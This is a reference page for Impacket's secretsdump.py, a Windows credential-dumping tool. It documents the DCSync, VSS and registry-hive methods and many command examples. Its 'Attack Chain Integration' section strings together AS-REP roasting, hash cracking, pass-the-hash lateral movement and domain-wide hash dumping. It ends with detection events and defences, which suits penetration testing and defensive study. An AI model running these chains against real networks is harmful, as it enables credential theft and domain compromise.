# secretsdump.py

## Overview
`secretsdump.py` is one of the most powerful credential extraction tools in the Impacket suite. It performs various techniques to dump password hashes, secrets, and cached credentials from Windows systems without executing any agent on the target machine.

## Detailed Description
This script implements multiple techniques to extract sensitive information from Windows systems, including SAM database hashes, LSA secrets, cached domain credentials, and NTDS.dit data. It can operate remotely over SMB or locally on extracted registry hives.

### Key Features:
- **SAM Database Extraction**: Local user account hashes
- **LSA Secrets Extraction**: Service account passwords, cached credentials
- **NTDS.dit Extraction**: Domain user hashes via DCSync or VSS
- **Cached Credentials**: Domain user credentials cached locally
- **Kerberos Keys**: AES and DES keys for Kerberos authentication
- **Remote Operation**: Works over SMB without local execution
- **Multiple Methods**: DCSync, VSS, and registry-based extraction

### Technical Methods:
1. **DCSync**: Uses MS-DRDS DRSGetNCChanges() to replicate password data
2. **VSS Method**: Creates volume shadow copies to access locked files
3. **Registry Method**: Extracts data from SAM, SECURITY, and SYSTEM hives

## Command Line Options

```
usage: secretsdump.py [-h] [-sam sam] [-security security] [-system system]
                      [-bootkey bootkey] [-ntds ntds] [-resumefile resumefile]
                      [-outputfile outputfile] [-use-vss] [-rodcNo RODC_NO]
                      [-rodcKey RODC_KEY] [-use-keylist] [-exec-method [{smbexec,wmiexec,mmcexec}]]
                      [-just-dc-user USERNAME] [-just-dc] [-just-dc-ntlm]
                      [-pwd-last-set] [-user-status] [-history] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip]
                      [-target-ip ip] [-port [destination port]] [-debug]
                      [target]

Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos
  -keytab               Kerberos keytab file

Local Files:
  -sam                  SAM hive file
  -security             SECURITY hive file  
  -system               SYSTEM hive file
  -bootkey              Bootkey for offline parsing
  -ntds                 NTDS.dit file

Remote Options:
  -use-vss              Use Volume Shadow Copy Service
  -exec-method          Execution method for remote commands
  -just-dc              Extract only NTDS.DIT data (DCSync)
  -just-dc-user         Extract data for specific user only
  -just-dc-ntlm         Extract only NTLM hashes
  -pwd-last-set         Show password last set time
  -user-status          Show user account status
  -history              Include password history
  -resumefile           Resume from previous extraction
  -outputfile           Output file for results
```

## Usage Examples

### Domain Controller Hash Extraction (DCSync)
```bash
# Extract all domain hashes using DCSync
python3 secretsdump.py domain.com/user:password@dc.domain.com

# Extract specific user with DCSync
python3 secretsdump.py domain.com/user:password@dc.domain.com -just-dc-user administrator

# Extract only NTLM hashes
python3 secretsdump.py domain.com/user:password@dc.domain.com -just-dc-ntlm
```

### Workstation/Server Hash Extraction
```bash
# Extract local SAM, LSA secrets, and cached credentials
python3 secretsdump.py domain.com/user:password@target.domain.com

# Use VSS method for extraction
python3 secretsdump.py domain.com/user:password@target.domain.com -use-vss

# Specify execution method
python3 secretsdump.py domain.com/user:password@target.domain.com -exec-method wmiexec
```

### Using Hash Authentication
```bash
# Use NTLM hash for authentication
python3 secretsdump.py -hashes :ntlmhash domain.com/user@target.domain.com

# Use AES key for Kerberos authentication
python3 secretsdump.py -aesKey aeskey domain.com/user@target.domain.com -k
```

### Local File Analysis
```bash
# Analyze local registry hives
python3 secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL

# Analyze NTDS.dit with SYSTEM hive
python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# Use bootkey for decryption
python3 secretsdump.py -sam sam.hive -system system.hive -bootkey 0x1234567890abcdef LOCAL
```

### Advanced Options
```bash
# Include password history and user status
python3 secretsdump.py domain.com/user:password@dc.domain.com -history -user-status -pwd-last-set

# Resume interrupted extraction
python3 secretsdump.py domain.com/user:password@dc.domain.com -resumefile resume.txt

# Save output to file
python3 secretsdump.py domain.com/user:password@dc.domain.com -outputfile hashes.txt
```

## Attack Chain Integration

### Initial Domain Compromise
```bash
# Step 1: Gain initial access with low-privileged account
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request

# Step 2: Crack obtained hashes and gain valid credentials
hashcat -m 18200 hashes.txt wordlist.txt

# Step 3: Dump all domain hashes with valid credentials
python3 secretsdump.py domain.com/cracked_user:password@dc.domain.com
```

### Lateral Movement Chain
```bash
# Step 1: Extract local hashes from compromised machine
python3 secretsdump.py domain.com/user:password@workstation.domain.com

# Step 2: Use extracted local admin hash for lateral movement
python3 psexec.py -hashes :localhash administrator@target.domain.com

# Step 3: Extract more credentials from new target
python3 secretsdump.py -hashes :localhash administrator@target.domain.com
```

### Privilege Escalation Chain
```bash
# Step 1: Extract cached domain credentials
python3 secretsdump.py domain.com/user:password@target.domain.com

# Step 2: Crack cached credentials to get privileged account
hashcat -m 2100 cached_creds.txt wordlist.txt

# Step 3: Use privileged account for DCSync
python3 secretsdump.py domain.com/domain_admin:password@dc.domain.com -just-dc
```

## Output Analysis

### SAM Hash Format
```
[*] SAMHashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### LSA Secrets Format
```
[*] LSASecrets
(L) DPAPI_SYSTEM:0x01000000d08c9ddf0115d1118c7a00c04fc297eb01000000
(L) NL$KM:0x0123456789abcdef...
$MACHINE.ACC: DOMAIN\COMPUTERNAME$:0x123...
```

### NTDS Hash Format
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash::: )
domain.com\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
domain.com\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## Prerequisites
- Valid domain credentials or local admin access
- Network connectivity to target (SMB, RPC)
- For DCSync: Domain Admin, Enterprise Admin, or specific replication rights
- For local extraction: Administrative privileges on target system

## Detection Considerations
- **DCSync Detection**: Event IDs 4662 (replication requests), unusual replication activity
- **VSS Activity**: Event ID 8222 (shadow copy creation), unusual vssadmin usage
- **Registry Access**: Event IDs 4656/4663 (SAM/SECURITY hive access)
- **Network Indicators**: Unusual SMB/RPC traffic patterns
- **Process Indicators**: Suspicious process execution for remote commands

## Defensive Measures
- Implement DCSync detection rules
- Monitor shadow copy creation and registry access
- Use privileged access management (PAM)
- Enable advanced threat protection
- Regular password rotation and strong password policies
- Limit replication permissions
- Network segmentation and access controls

## Related Tools
- [psexec.py](psexec.md) - Often used together for complete system compromise
- [wmiexec.py](wmiexec.md) - Alternative execution method for secretsdump
- [smbexec.py](smbexec.md) - Another execution method
- [mimikatz.py](mimikatz.md) - Complementary credential extraction
- [GetUserSPNs.py](GetUserSPNs.md) - Often used before secretsdump for service accounts
- [ntlmrelayx.py](ntlmrelayx.md) - Can capture credentials for use with secretsdump
